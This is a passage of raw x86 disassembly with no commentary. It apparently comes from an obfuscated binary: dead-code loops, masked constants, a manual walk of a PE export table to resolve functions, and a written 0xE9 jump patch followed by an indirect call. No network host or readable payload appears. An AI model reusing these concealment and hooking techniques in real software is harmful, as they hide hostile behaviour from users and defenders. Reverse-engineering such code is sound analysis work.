  4232d5:	mov    ecx,DWORD PTR [ebp-0x14]
  4232d8:	sub    eax,ecx
  4232da:	mov    DWORD PTR [ebp-0x8],eax
  4232dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4232e0:	xor    ecx,esi
  4232e2:	mov    eax,0xffcd8d0f
  4232e7:	sub    eax,ecx
  4232e9:	add    DWORD PTR [ebp-0x8],eax
  4232ec:	mov    eax,DWORD PTR [ebp-0x8]
  4232ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4232f2:	mov    DWORD PTR [ecx+0x1],eax
  4232f5:	mov    eax,DWORD PTR [ebp-0x14]
  4232f8:	push   DWORD PTR [ebp-0x24]
  4232fb:	mov    BYTE PTR [eax],0xe9
  4232fe:	mov    eax,ds:0x42929a
  423303:	push   DWORD PTR [eax]
  423305:	push   DWORD PTR ds:0x4294fe
  42330b:	push   DWORD PTR ds:0x4292a2
  423311:	push   DWORD PTR ds:0x4294de
  423317:	push   DWORD PTR ds:0x42a04a
  42331d:	push   DWORD PTR [ebp-0x28]
  423320:	push   DWORD PTR [ebp-0x2c]
  423323:	mov    eax,DWORD PTR [ebp-0x14]
  423326:	call   eax
  423328:	pop    edi
  423329:	pop    esi
  42332a:	leave  
  42332b:	ret    
  42332c:	push   ebp
  42332d:	mov    ebp,esp
  42332f:	sub    esp,0x1c
  423332:	mov    DWORD PTR ds:0x42a2ea,0x10
  42333c:	cmp    DWORD PTR ds:0x42a2ea,0x0
  423343:	je     0x423373
  423349:	cmp    DWORD PTR ds:0x42a2ea,0x17
  423350:	jg     0x423373
  423356:	jmp    0x423361
  42335b:	call   DWORD PTR ds:0x42a3e2
  423361:	mov    ecx,DWORD PTR ds:0x42a2ea
  423367:	dec    ecx
  423368:	mov    DWORD PTR ds:0x42a2ea,ecx
  42336e:	jmp    0x42333c
  423373:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  42337a:	sbb    ecx,ecx
  42337c:	lea    eax,[ebp+0x14]
  42337f:	sub    edx,DWORD PTR ds:0x42a2da
  423385:	mov    DWORD PTR [ebp-0x4],eax
  423388:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42338f:	and    DWORD PTR ds:0x42a302,0x5581
  423399:	lea    eax,[ebp-0xc]
  42339c:	and    DWORD PTR ds:0x42a256,0x0
  4233a6:	jmp    0x4233ba
  4233ab:	xor    ecx,ecx
  4233ad:	or     ecx,DWORD PTR ds:0x42a256
  4233b3:	inc    ecx
  4233b4:	mov    DWORD PTR ds:0x42a256,ecx
  4233ba:	cmp    DWORD PTR ds:0x42a256,0x1e
  4233c1:	jae    0x423412
  4233c7:	cmp    DWORD PTR ds:0x42a256,0x4
  4233ce:	jg     0x423412
  4233d4:	jmp    0x4233f3
  4233d9:	push   0x42a25a
  4233de:	push   0x6352
  4233e3:	push   0x429009
  4233e8:	push   0x42904c
  4233ed:	call   DWORD PTR ds:0x42a3ea
  4233f3:	cmp    DWORD PTR ds:0x42a256,0x3
  4233fa:	jne    0x42340d
  423400:	mov    ecx,DWORD PTR ds:0x42a256
  423406:	inc    ecx
  423407:	mov    DWORD PTR ds:0x42a256,ecx
  42340d:	jmp    0x4233ab
  423412:	mov    DWORD PTR [ebp-0x14],eax
  423415:	and    DWORD PTR ds:0x42a2f2,0x0
  42341f:	jmp    0x423432
  423424:	xor    eax,eax
  423426:	add    eax,DWORD PTR ds:0x42a2f2
  42342c:	inc    eax
  42342d:	mov    ds:0x42a2f2,eax
  423432:	cmp    DWORD PTR ds:0x42a2f2,0x16
  423439:	jae    0x42346b
  42343f:	cmp    DWORD PTR ds:0x42a2f2,0x1d
  423446:	jbe    0x42346b
  42344c:	jmp    0x423466
  423451:	push   0x76a3
  423456:	push   0x42a296
  42345b:	push   0x659d
  423460:	call   DWORD PTR ds:0x42a3ee
  423466:	jmp    0x423424
  42346b:	mov    eax,DWORD PTR [ebp-0xc]
  42346e:	mov    edx,DWORD PTR [ebp-0x14]
  423471:	neg    ecx
  423473:	mov    ecx,0x75108aa
  423478:	xor    eax,ecx
  42347a:	or     DWORD PTR ds:0x42a2c2,0x55df
  423484:	add    eax,0x3272f1
  423489:	mov    DWORD PTR [edx],eax
  42348b:	xor    edx,edx
  42348d:	xor    edx,DWORD PTR ds:0x42a34a
  423493:	xor    eax,eax
  423495:	or     eax,DWORD PTR ds:0x42a35a
  42349b:	sub    edx,eax
  42349d:	sub    edx,DWORD PTR [edx+eax*1]
  4234a0:	mov    eax,ds:0x429296
  4234a5:	mov    DWORD PTR ds:0x42a2da,0x16
  4234af:	cmp    DWORD PTR ds:0x42a2da,0x0
  4234b6:	je     0x4234ee
  4234bc:	cmp    DWORD PTR ds:0x42a2da,0x1d
  4234c3:	jge    0x4234ee
  4234c9:	jmp    0x4234dc
  4234ce:	push   DWORD PTR [ebp-0x20]
  4234d1:	push   0x42a2ca
  4234d6:	call   DWORD PTR ds:0x42a3f2
  4234dc:	mov    edx,DWORD PTR ds:0x42a2da
  4234e2:	dec    edx
  4234e3:	mov    DWORD PTR ds:0x42a2da,edx
  4234e9:	jmp    0x4234af
  4234ee:	mov    edx,DWORD PTR [ebp-0x4]
  4234f1:	adc    DWORD PTR ds:0x42a2be,0x42a256
  4234fb:	mov    eax,DWORD PTR [eax]
  4234fd:	and    DWORD PTR ds:0x42a286,0x12f2
  423507:	add    eax,DWORD PTR [edx]
  423509:	push   esi
  42350a:	mov    DWORD PTR [ebp-0x8],eax
  42350d:	and    DWORD PTR ds:0x42a2f6,0x290a
  423517:	mov    edx,DWORD PTR [ebp+0x8]
  42351a:	mov    eax,ds:0x42941e
  42351f:	sbb    esi,0x612f
  423525:	mov    eax,DWORD PTR [eax+0x198]
  42352b:	xor    edx,ecx
  42352d:	neg    esi
  42352f:	mov    esi,0x3272f1
  423534:	add    edx,esi
  423536:	mov    DWORD PTR ds:0x42a2b6,0x4be9
  423540:	cmp    DWORD PTR [eax],edx
  423542:	je     0x423563
  423548:	mov    DWORD PTR ds:0x42a2ea,0x6dae
  423552:	mov    eax,DWORD PTR [eax]
  423554:	mov    DWORD PTR ds:0x42a2da,0x1950
  42355e:	jmp    0x4239a6
  423563:	sbb    eax,DWORD PTR ds:0x42a296
  423569:	mov    eax,DWORD PTR [ebp+0x18]
  42356c:	xor    eax,ecx
  42356e:	adc    DWORD PTR ds:0x42a2e6,0x42a2b2
  423578:	push   ebx
  423579:	add    eax,esi
  42357b:	add    ebx,DWORD PTR ds:0x42a2a2
  423581:	xor    edx,edx
  423583:	mov    ebx,DWORD PTR ds:0x42a2c6
  423589:	xor    DWORD PTR ds:0x42a2a2,ebx
  42358f:	mov    ebx,0xfabdbed8
  423594:	adc    DWORD PTR ds:0x42a2ae,0x6fd6
  42359e:	add    eax,ebx
  4235a0:	mov    DWORD PTR ds:0x42a296,0x25f1
  4235aa:	push   edi
  4235ab:	mov    DWORD PTR ds:0x42a2be,0x342
  4235b5:	adc    edx,0xffffffff
  4235b8:	and    DWORD PTR ds:0x42a2ee,0x0
  4235c2:	jmp    0x4235d4
  4235c7:	mov    edi,DWORD PTR ds:0x42a2ee
  4235cd:	inc    edi
  4235ce:	mov    DWORD PTR ds:0x42a2ee,edi
  4235d4:	cmp    DWORD PTR ds:0x42a2ee,0x10
  4235db:	jae    0x42361d
  4235e1:	cmp    DWORD PTR ds:0x42a2ee,0x6
  4235e8:	jbe    0x42361d
  4235ee:	jmp    0x4235fe
  4235f3:	push   0x42a2fe
  4235f8:	call   DWORD PTR ds:0x42a3f6
  4235fe:	cmp    DWORD PTR ds:0x42a2ee,0x5
  423605:	jne    0x423618
  42360b:	mov    edi,DWORD PTR ds:0x42a2ee
  423611:	inc    edi
  423612:	mov    DWORD PTR ds:0x42a2ee,edi
  423618:	jmp    0x4235c7
  42361d:	mov    edi,0x8a29a13d
  423622:	mov    DWORD PTR ds:0x42a25e,0x2bce
  42362c:	xor    eax,edi
  42362e:	sub    DWORD PTR ds:0x42a266,0x304b
  423638:	xor    edx,0x0
  42363b:	mov    DWORD PTR ds:0x42a2b2,0x550
  423645:	cmp    eax,0x70941fe5
  42364a:	mov    DWORD PTR ds:0x42a2c2,0x6d49
  423654:	jne    0x42368b
  42365a:	mov    DWORD PTR ds:0x42a2fa,0x2c4a
  423664:	cmp    edx,0xffffffff
  423667:	mov    DWORD PTR ds:0x42a2de,0x7cde
  423671:	jne    0x42368b
  423677:	push   0xf89c85ba
  42367c:	mov    DWORD PTR ds:0x42a2ca,0x25f0
  423686:	jmp    0x423993
  42368b:	xor    DWORD PTR ds:0x42a2e2,edi
  423691:	mov    eax,DWORD PTR [ebp+0x18]
  423694:	and    DWORD PTR ds:0x42a25a,0x42a296
  42369e:	xor    eax,ecx
  4236a0:	add    eax,esi
  4236a2:	sub    DWORD PTR ds:0x42a292,0x6866
  4236ac:	xor    edx,edx
  4236ae:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  4236b8:	add    eax,ebx
  4236ba:	mov    DWORD PTR ds:0x42a2f6,0x1dc4
  4236c4:	adc    edx,0xffffffff
  4236c7:	not    DWORD PTR ds:0x42a2ae
  4236cd:	xor    eax,edi
  4236cf:	xor    edx,0x0
  4236d2:	cmp    eax,0x70941fe7
  4236d7:	jne    0x423980
  4236dd:	cmp    edx,0xffffffff
  4236e0:	jne    0x423980
  4236e6:	mov    eax,DWORD PTR [ebp+0x10]
  4236e9:	xor    eax,ecx
  4236eb:	mov    DWORD PTR ds:0x42a2aa,0x16
  4236f5:	cmp    DWORD PTR ds:0x42a2aa,0x0
  4236fc:	je     0x423739
  423702:	cmp    DWORD PTR ds:0x42a2aa,0x25
  423709:	jbe    0x423739
  42370f:	jmp    0x423727
  423714:	push   0x1425
  423719:	push   0x42a2b6
  42371e:	push   DWORD PTR [ebp-0x14]
  423721:	call   DWORD PTR ds:0x42a3fa
  423727:	mov    edx,DWORD PTR ds:0x42a2aa
  42372d:	dec    edx
  42372e:	mov    DWORD PTR ds:0x42a2aa,edx
  423734:	jmp    0x4236f5
  423739:	add    eax,esi
  42373b:	mov    edx,DWORD PTR ds:0x42a292
  423741:	sbb    edx,DWORD PTR ds:0x42a2de
  423747:	mov    DWORD PTR ds:0x42a292,edx
  42374d:	mov    DWORD PTR [ebp-0x18],eax
  423750:	and    DWORD PTR ds:0x42a2b6,0x0
  42375a:	jmp    0x42376a
  42375f:	mov    eax,ds:0x42a2b6
  423764:	inc    eax
  423765:	mov    ds:0x42a2b6,eax
  42376a:	cmp    DWORD PTR ds:0x42a2b6,0x13
  423771:	jae    0x42379f
  423777:	cmp    DWORD PTR ds:0x42a2b6,0x17
  42377e:	ja     0x42379f
  423784:	jmp    0x42379a
  423789:	push   0x3d13
  42378e:	push   DWORD PTR [ebp-0x14]
  423791:	push   DWORD PTR [ebp-0x14]
  423794:	call   DWORD PTR ds:0x42a402
  42379a:	jmp    0x42375f
  42379f:	mov    eax,DWORD PTR [ebp+0xc]
  4237a2:	mov    edx,DWORD PTR [ebp-0x8]
  4237a5:	xor    eax,ecx
  4237a7:	not    DWORD PTR ds:0x42a2ea
  4237ad:	add    eax,esi
  4237af:	imul   eax,DWORD PTR [edx]
  4237b2:	dec    edx
  4237b3:	mov    edx,DWORD PTR [ebp+0x8]
  4237b6:	xor    edx,ecx
  4237b8:	add    edx,esi
  4237ba:	cmp    edx,eax
  4237bc:	mov    eax,DWORD PTR [ebp-0x4]
  4237bf:	mov    DWORD PTR ds:0x42a26a,0x1fb7
  4237c9:	je     0x4237fd
  4237cf:	mov    edx,DWORD PTR [ebp-0x18]
  4237d2:	add    DWORD PTR [eax],edx
  4237d4:	mov    eax,DWORD PTR [ebp-0x4]
  4237d7:	mov    edx,DWORD PTR [ebp+0xc]
  4237da:	xor    edx,ecx
  4237dc:	add    edx,esi
  4237de:	imul   edx,DWORD PTR [eax]
  4237e1:	mov    DWORD PTR [eax],edx
  4237e3:	mov    eax,DWORD PTR [ebp-0x4]
  4237e6:	mov    DWORD PTR [ebp-0x1c],eax
  4237e9:	mov    eax,DWORD PTR [ebp+0x10]
  4237ec:	xor    eax,ecx
  4237ee:	mov    edx,0xffcd8d0f
  4237f3:	sub    edx,eax
  4237f5:	mov    eax,DWORD PTR [ebp-0x1c]
  4237f8:	jmp    0x423817
  4237fd:	mov    edx,DWORD PTR [ebp+0x14]
  423800:	xor    DWORD PTR [eax],edx
  423802:	mov    eax,DWORD PTR [ebp-0x4]
  423805:	mov    DWORD PTR [ebp-0x1c],eax
  423808:	mov    eax,DWORD PTR [ebp+0x10]
  42380b:	xor    eax,ecx
  42380d:	mov    edx,0xffcd8d0f
  423812:	sub    edx,eax
  423814:	mov    eax,DWORD PTR [ebp-0x1c]
  423817:	add    DWORD PTR [eax],edx
  423819:	mov    eax,DWORD PTR [ebp-0x4]
  42381c:	mov    edx,DWORD PTR [ebp-0x8]
  42381f:	add    edx,DWORD PTR [eax]
  423821:	mov    DWORD PTR [ebp-0x8],edx
  423824:	mov    eax,DWORD PTR [ebp+0xc]
  423827:	mov    edx,DWORD PTR [ebp+0xc]
  42382a:	xor    edx,ecx
  42382c:	xor    eax,ecx
  42382e:	lea    eax,[eax+edx*1+0x64e5e2]
  423835:	mov    edx,DWORD PTR [ebp+0xc]
  423838:	xor    edx,ecx
  42383a:	add    edx,esi
  42383c:	imul   eax,edx
  42383f:	mov    edx,DWORD PTR [ebp+0xc]
  423842:	xor    edx,ecx
  423844:	sub    edx,eax
  423846:	mov    eax,DWORD PTR [ebp-0x4]
  423849:	add    edx,esi
  42384b:	cmp    DWORD PTR [eax],edx
  42384d:	mov    eax,DWORD PTR [ebp-0x4]
  423850:	jg     0x42386d
  423856:	mov    DWORD PTR [ebp-0x1c],eax
  423859:	mov    eax,DWORD PTR [ebp+0x10]
  42385c:	xor    eax,ecx
  42385e:	mov    edx,0xffcd8d0f
  423863:	sub    edx,eax
  423865:	mov    eax,DWORD PTR [ebp-0x1c]
  423868:	jmp    0x423874
  42386d:	mov    edx,DWORD PTR [ebp+0x10]
  423870:	xor    edx,ecx
  423872:	add    edx,esi
  423874:	add    DWORD PTR [eax],edx
  423876:	mov    eax,DWORD PTR [ebp-0x8]
  423879:	mov    edx,DWORD PTR [ebp-0x10]
  42387c:	mov    eax,DWORD PTR [eax]
  42387e:	xor    edx,ecx
  423880:	add    edx,0x3272f0
  423886:	not    edx
  423888:	and    eax,edx
  42388a:	mov    DWORD PTR [ebp-0x4],eax
  42388d:	movsx  eax,BYTE PTR [eax+0x1]
  423891:	cdq    
  423892:	add    eax,ebx
  423894:	adc    edx,0xffffffff
  423897:	xor    eax,edi
  423899:	xor    edx,0x0
  42389c:	cmp    eax,0x70941e0f
  4238a1:	jne    0x4238d5
  4238a7:	cmp    edx,0xffffffff
  4238aa:	jne    0x4238d5
  4238b0:	mov    eax,DWORD PTR [ebp-0x4]
  4238b3:	movsx  eax,BYTE PTR [eax]
  4238b6:	cdq    
  4238b7:	add    eax,ebx
  4238b9:	adc    edx,0xffffffff
  4238bc:	xor    eax,edi
  4238be:	xor    edx,0x0
  4238c1:	cmp    eax,0x70941e18
  4238c6:	jne    0x4238d5
  4238cc:	cmp    edx,0xffffffff
  4238cf:	je     0x4238ec
  4238d5:	mov    eax,DWORD PTR [ebp-0x10]
  4238d8:	xor    eax,ecx
  4238da:	mov    edx,0xffcd8d0f
  4238df:	sub    edx,eax
  4238e1:	add    DWORD PTR [ebp-0x4],edx
  4238e4:	mov    eax,DWORD PTR [ebp-0x4]
  4238e7:	jmp    0x42388d
  4238ec:	mov    eax,DWORD PTR [ebp-0x14]
  4238ef:	mov    eax,DWORD PTR [eax]
  4238f1:	mov    edx,DWORD PTR [ebp-0x4]
  4238f4:	mov    edx,DWORD PTR [edx+0x3c]
  4238f7:	lea    eax,[edx+eax*8+0x78]
  4238fb:	mov    edx,DWORD PTR [ebp-0x4]
  4238fe:	mov    eax,DWORD PTR [eax+edx*1]
  423901:	mov    DWORD PTR [ebp-0x8],eax
  423904:	mov    eax,DWORD PTR [ebp+0x8]
  423907:	xor    eax,ecx
  423909:	add    eax,esi
  42390b:	mov    DWORD PTR [ebp-0x14],eax
  42390e:	mov    eax,DWORD PTR [ebp+0x8]
  423911:	mov    edx,DWORD PTR [ebp-0x8]
  423914:	xor    eax,ecx
  423916:	add    eax,esi
  423918:	cmp    edx,eax
  42391a:	jne    0x423938
  423920:	mov    eax,DWORD PTR [ebp+0xc]
  423923:	xor    eax,ecx
  423925:	mov    ecx,DWORD PTR [ebp-0x8]
  423928:	add    eax,esi
  42392a:	imul   eax,ecx
  42392d:	mov    DWORD PTR [ebp-0x8],eax
  423930:	push   DWORD PTR [ebp+0x18]
  423933:	jmp    0x423993
  423938:	mov    eax,DWORD PTR [ebp-0x8]
  42393b:	mov    ecx,DWORD PTR [ebp-0x4]
  42393e:	add    eax,ecx
  423940:	mov    DWORD PTR [ebp-0x14],eax
  423943:	mov    eax,DWORD PTR [ebp-0x14]
  423946:	mov    eax,DWORD PTR [eax+0xc]
  423949:	movsx  eax,BYTE PTR [eax+ecx*1]
  42394d:	cdq    
  42394e:	add    eax,ebx
  423950:	adc    edx,0xffffffff
  423953:	xor    eax,edi
  423955:	xor    edx,0x0
  423958:	cmp    eax,0x70941e1e
  42395d:	jne    0x423930
  423963:	cmp    edx,0xffffffff
  423966:	jne    0x423930
  42396c:	mov    eax,ds:0x42941e
  423971:	mov    eax,DWORD PTR [eax+0x198]
  423977:	mov    DWORD PTR [eax],ecx
  423979:	mov    eax,ecx
  42397b:	jmp    0x4239a4
  423980:	mov    eax,DWORD PTR [ebp+0x18]
  423983:	cmp    eax,0xf89c85ba
  423988:	jne    0x4239a4
  42398e:	push   0xf89c85bb
  423993:	push   DWORD PTR [ebp+0x14]
  423996:	push   DWORD PTR [ebp+0x10]
  423999:	push   DWORD PTR [ebp+0xc]
  42399c:	push   DWORD PTR [ebp+0x8]
  42399f:	call   0x42332c
  4239a4:	pop    edi
  4239a5:	pop    ebx
  4239a6:	pop    esi
  4239a7:	leave  
  4239a8:	ret    0x14
  4239ab:	push   ebp
  4239ac:	mov    ebp,esp
  4239ae:	and    esp,0xfffffff8
  4239b1:	mov    DWORD PTR ds:0x42a276,0x3141
  4239bb:	sub    esp,0x3fc
  4239c1:	mov    DWORD PTR ds:0x42a2fa,0x2654
  4239cb:	push   ebx
  4239cc:	push   esi
  4239cd:	adc    DWORD PTR ds:0x42a2f2,0x42a2e6
  4239d7:	push   edi
  4239d8:	xor    edi,edi
  4239da:	or     DWORD PTR ds:0x42a256,0x42a2de
  4239e4:	push   edi
  4239e5:	call   DWORD PTR ds:0x42a3b6
  4239eb:	add    DWORD PTR ds:0x42a2e2,0x667e
  4239f5:	mov    DWORD PTR [esp+0x10],eax
  4239f9:	sbb    DWORD PTR ds:0x42a2f2,0x42a27e
  423a03:	lea    eax,[esp+0x78]
  423a07:	push   eax
  423a08:	sbb    DWORD PTR ds:0x42a302,0x70a3
  423a12:	push   0x429542
  423a17:	or     DWORD PTR ds:0x42a2be,0x4f4
  423a21:	call   DWORD PTR ds:0x42a3c6
  423a27:	mov    DWORD PTR ds:0x42a2c6,0x224d
  423a31:	cmp    eax,0xffffffff
  423a34:	mov    DWORD PTR ds:0x42a26a,0x664
  423a3e:	je     0x423a55
  423a44:	xor    eax,eax
  423a46:	mov    DWORD PTR ds:0x42a2ee,0x6e63
  423a50:	jmp    0x424ca7
  423a55:	mov    DWORD PTR ds:0x42a2ee,0x3a46
  423a5f:	mov    esi,DWORD PTR ds:0x42a3fe
  423a65:	push   0xf
  423a67:	lea    eax,[esp+0x44]
  423a6b:	xor    DWORD PTR ds:0x42a26a,0x150a
  423a75:	push   eax
  423a76:	push   0x429556
  423a7b:	push   0x42956a
  423a80:	xor    DWORD PTR ds:0x42a2de,0x3930
  423a8a:	push   0x42958a
  423a8f:	call   esi
  423a91:	imul   eax,eax,0x300000
  423a97:	cmp    eax,0x1b00000
  423a9c:	jne    0x423a44
  423aa2:	sub    DWORD PTR ds:0x42a26a,0x42a2e2
  423aac:	lea    eax,[esp+0x1b8]
  423ab3:	adc    DWORD PTR ds:0x42a28e,0x3c8a
  423abd:	push   eax
  423abe:	push   0x4295c6
  423ac3:	call   DWORD PTR ds:0x42a3e6
  423ac9:	mov    DWORD PTR ds:0x42a2ca,0x78b4
  423ad3:	cmp    eax,0xffffffff
  423ad6:	mov    DWORD PTR ds:0x42a296,0x5d2d
  423ae0:	jne    0x423a44
  423ae6:	and    DWORD PTR ds:0x42a25e,0x42a266
  423af0:	push   DWORD PTR [esp+0x10]
  423af4:	push   edi
  423af5:	call   DWORD PTR ds:0x42a3ba
  423afb:	add    DWORD PTR ds:0x42a256,0x6e9d
  423b05:	mov    DWORD PTR [esp+0x30],edi
  423b09:	or     ecx,ecx
  423b0b:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423b13:	mov    DWORD PTR ds:0x42a2ba,0x17
  423b1d:	cmp    DWORD PTR ds:0x42a2ba,0x0
  423b24:	je     0x423b87
  423b2a:	cmp    DWORD PTR ds:0x42a2ba,0x4
  423b31:	jl     0x423b87
  423b37:	jmp    0x423b59
  423b3c:	push   0x1
  423b3e:	push   0x4b19
  423b43:	push   DWORD PTR [ebp-0x1c]
  423b46:	push   0x1751
  423b4b:	push   0x1baf
  423b50:	push   DWORD PTR [ebp-0x24]
  423b53:	call   DWORD PTR ds:0x42a3c2
  423b59:	cmp    DWORD PTR ds:0x42a2ba,0x5
  423b60:	jne    0x423b73
  423b66:	mov    ecx,DWORD PTR ds:0x42a2ba
  423b6c:	dec    ecx
  423b6d:	mov    DWORD PTR ds:0x42a2ba,ecx
  423b73:	xor    ecx,ecx
  423b75:	xor    ecx,DWORD PTR ds:0x42a2ba
  423b7b:	dec    ecx
  423b7c:	mov    DWORD PTR ds:0x42a2ba,ecx
  423b82:	jmp    0x423b1d
  423b87:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423b8f:	adc    DWORD PTR ds:0x42a292,edx
  423b95:	lea    eax,[esp+0x3c]
  423b99:	mov    edi,DWORD PTR ds:0x42a2ba
  423b9f:	or     DWORD PTR ds:0x42a26e,edi
  423ba5:	mov    DWORD PTR [esp+0x30],eax
  423ba9:	lea    eax,[esp+0x38]
  423bad:	and    edi,ecx
  423baf:	mov    DWORD PTR [esp+0x10],eax
  423bb3:	add    edi,ecx
  423bb5:	mov    eax,ds:0x42941e
  423bba:	and    DWORD PTR ds:0x42a25a,0x0
  423bc4:	jmp    0x423bd6
  423bc9:	mov    edi,DWORD PTR ds:0x42a25a
  423bcf:	inc    edi
  423bd0:	mov    DWORD PTR ds:0x42a25a,edi
  423bd6:	cmp    DWORD PTR ds:0x42a25a,0x16
  423bdd:	jae    0x423c0a
  423be3:	cmp    DWORD PTR ds:0x42a25a,0x17
  423bea:	jbe    0x423c0a
  423bf0:	jmp    0x423c05
  423bf5:	push   0x42a256
  423bfa:	push   0x42919f
  423bff:	call   DWORD PTR ds:0x42a3ca
  423c05:	jmp    0x423bc9
  423c0a:	mov    eax,DWORD PTR [eax+0x1c8]
  423c10:	sbb    ebx,edi
  423c12:	mov    eax,DWORD PTR [eax]
  423c14:	add    DWORD PTR ds:0x42a26a,0x5b95
  423c1e:	mov    ecx,DWORD PTR [esp+0x10]
  423c22:	mov    edi,0x75108aa
  423c27:	mov    ebx,DWORD PTR ds:0x42a2e6
  423c2d:	sbb    DWORD PTR ds:0x42a25e,ebx
  423c33:	xor    eax,edi
  423c35:	adc    DWORD PTR ds:0x42a2fe,0x37f0
  423c3f:	mov    ebx,0x3272f1
  423c44:	add    DWORD PTR ds:0x42a2ae,0x42a2b2
  423c4e:	add    eax,ebx
  423c50:	not    DWORD PTR ds:0x42a2ae
  423c56:	mov    DWORD PTR [ecx],eax
  423c58:	mov    DWORD PTR ds:0x42a2d6,0x5252
  423c62:	mov    eax,ds:0x42a11a
  423c67:	cmp    eax,0x445cecf9
  423c6c:	mov    DWORD PTR ds:0x42a2c6,0x4b3f
  423c76:	jne    0x423d64
  423c7c:	mov    eax,DWORD PTR [esp+0x20]
  423c80:	and    DWORD PTR ds:0x42a2b6,0x0
  423c8a:	jmp    0x423c9c
  423c8f:	mov    ecx,DWORD PTR ds:0x42a2b6
  423c95:	inc    ecx
  423c96:	mov    DWORD PTR ds:0x42a2b6,ecx
  423c9c:	cmp    DWORD PTR ds:0x42a2b6,0x14
  423ca3:	jae    0x423cec
  423ca9:	cmp    DWORD PTR ds:0x42a2b6,0x8
  423cb0:	ja     0x423cec
  423cb6:	jmp    0x423ccb
  423cbb:	push   0x84fb
  423cc0:	push   0x42a28e
  423cc5:	call   DWORD PTR ds:0x42a3ce
  423ccb:	cmp    DWORD PTR ds:0x42a2b6,0x7
  423cd2:	jne    0x423ce7
  423cd8:	xor    ecx,ecx
  423cda:	add    ecx,DWORD PTR ds:0x42a2b6
  423ce0:	inc    ecx
  423ce1:	mov    DWORD PTR ds:0x42a2b6,ecx
  423ce7:	jmp    0x423c8f
  423cec:	mov    ecx,DWORD PTR ds:0x42941e
  423cf2:	adc    DWORD PTR ds:0x42a2be,0x42a2b2
  423cfc:	mov    ecx,DWORD PTR [ecx+0x198]
  423d02:	adc    DWORD PTR ds:0x42a2ae,0x42a29a
  423d0c:	xor    eax,edi
  423d0e:	sub    DWORD PTR ds:0x42a27a,0x42a2a2
  423d18:	add    eax,ebx
  423d1a:	add    DWORD PTR ds:0x42a26a,0x42a266
  423d24:	mov    DWORD PTR [ecx],eax
  423d26:	mov    eax,DWORD PTR [esp+0x20]
  423d2a:	xor    eax,edi
  423d2c:	not    DWORD PTR ds:0x42a2be
  423d32:	add    eax,ebx
  423d34:	sbb    DWORD PTR ds:0x42a2f6,0x42a2de
  423d3e:	mov    ds:0x42a11a,eax
  423d43:	mov    eax,DWORD PTR [esp+0x20]
  423d47:	sbb    DWORD PTR ds:0x42a286,0x42a26a
  423d51:	xor    eax,edi
  423d53:	sub    DWORD PTR ds:0x42a272,0x5dcc
  423d5d:	add    eax,ebx
  423d5f:	mov    ds:0x429516,eax
  423d64:	and    DWORD PTR ds:0x42a2ce,0x0
  423d6e:	xor    eax,eax
  423d70:	xor    eax,DWORD PTR ds:0x42a2ce
  423d76:	inc    eax
  423d77:	mov    ds:0x42a2ce,eax
  423d7c:	cmp    DWORD PTR ds:0x42a2ce,0x10
  423d83:	jg     0x423dc9
  423d89:	jmp    0x423da4
  423d8e:	push   DWORD PTR [ebp-0x18]
  423d91:	push   0x42a2b6
  423d96:	push   DWORD PTR [ebp-0x10]
  423d99:	push   0x4828
  423d9e:	call   DWORD PTR ds:0x42a3d2
  423da4:	cmp    DWORD PTR ds:0x42a2ce,0xf
  423dab:	jne    0x423dbc
  423db1:	mov    eax,ds:0x42a2ce
  423db6:	inc    eax
  423db7:	mov    ds:0x42a2ce,eax
  423dbc:	cmp    DWORD PTR ds:0x42a2ce,0x1a
  423dc3:	jb     0x423d6e
  423dc9:	mov    eax,ds:0x42941e
  423dce:	mov    eax,DWORD PTR [eax+0x18c]
  423dd4:	add    DWORD PTR ds:0x42a28e,0x42a292
  423dde:	mov    eax,DWORD PTR [eax]
  423de0:	neg    DWORD PTR ds:0x42a302
  423de6:	mov    DWORD PTR [esp+0x60],eax
  423dea:	xor    eax,eax
  423dec:	xor    eax,DWORD PTR ds:0x42a27a
  423df2:	xor    eax,DWORD PTR ds:0x42a266
  423df8:	mov    ds:0x42a27a,eax
  423dfd:	mov    eax,0xf89c85b9
  423e02:	mov    DWORD PTR [esp+0x18],eax
  423e06:	mov    DWORD PTR [esp+0x18],eax
  423e0a:	and    DWORD PTR ds:0x42a2ae,0xe84
  423e14:	mov    DWORD PTR [esp+0x18],eax
  423e18:	sub    DWORD PTR ds:0x42a2ce,0x42a2d6
  423e22:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423e2a:	adc    DWORD PTR ds:0x42a2f2,0x42a29a
  423e34:	mov    DWORD PTR [esp+0x10],eax
  423e38:	xor    eax,0x48fc
  423e3d:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423e45:	mov    eax,DWORD PTR [esp+0x20]
  423e49:	add    DWORD PTR ds:0x42a2fa,0x42a25e
  423e53:	xor    eax,edi
  423e55:	sub    DWORD PTR ds:0x42a29a,0x2bd1
  423e5f:	add    eax,ebx
  423e61:	mov    DWORD PTR ds:0x42a276,0x6294
  423e6b:	jmp    0x4240af
  423e70:	lea    eax,[esp+0x78]
  423e74:	push   eax
  423e75:	dec    DWORD PTR ds:0x42a292
  423e7b:	push   0x4295b2
  423e80:	adc    DWORD PTR ds:0x42a2fa,0x42a2de
  423e8a:	call   DWORD PTR ds:0x42a3c6
  423e90:	mov    DWORD PTR ds:0x42a262,0x2f3f
  423e9a:	cmp    eax,0xffffffff
  423e9d:	jne    0x423a44
  423ea3:	add    DWORD PTR ds:0x42a2da,0x42a2d2
  423ead:	push   0xf
  423eaf:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  423eb9:	lea    eax,[esp+0x44]
  423ebd:	push   eax
  423ebe:	push   0x429606
  423ec3:	push   0x42961a
  423ec8:	push   0x42963a
  423ecd:	call   esi
  423ecf:	or     DWORD PTR ds:0x42a2fa,0x3e60
  423ed9:	imul   eax,eax,0x300000
  423edf:	mov    DWORD PTR ds:0x42a2ae,0x6f02
  423ee9:	cmp    eax,0x1b00000
  423eee:	mov    DWORD PTR ds:0x42a256,0x6c6e
  423ef8:	jne    0x423a44
  423efe:	or     DWORD PTR ds:0x42a2ea,0x2c5c
  423f08:	lea    eax,[esp+0x1b8]
  423f0f:	push   eax
  423f10:	push   0x429676
  423f15:	add    DWORD PTR ds:0x42a2de,0x42a26e
  423f1f:	call   DWORD PTR ds:0x42a3e6
